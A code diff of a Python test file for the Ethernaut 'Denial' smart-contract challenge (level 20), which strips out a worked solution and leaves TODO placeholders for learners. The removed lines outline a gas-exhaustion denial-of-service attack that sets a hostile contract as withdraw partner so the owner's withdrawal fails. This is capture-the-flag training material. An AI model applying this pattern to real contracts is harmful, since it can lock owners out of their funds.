@@ -1,7 +1,7 @@
 from wake.testing import *
 from tests.ethernaut_deployer import EthernautDeployer
 from pytypes.contracts.lv20_denial import Denial
-from pytypes.contracts.attacker.lv20_broken_contract import BrokenContract
+# TODO You can import your our own smart contract(s) here.
 
 @default_chain.connect()
 def test_lv20():
@@ -11,10 +11,7 @@ def test_lv20():
     ethernaut.check_lv20(contract)
     
 def exploit_lv20(contract: Denial):
-    # Attack vector: function, that 'never' reverts
-    # Training: find opcode, that forces function to use all gas -> Denial.withdraw() function reverts
-
-    exploitContract = BrokenContract.deploy()
-    contract.call(value=100)
-    contract.setWithdrawPartner(exploitContract.address)
-    contract.withdraw()
+    # TODO Deny the owner from withdrawing funds.
+    # TODO You can import your our own smart contract(s) here.
+    # TODO Code here ...
+    pass
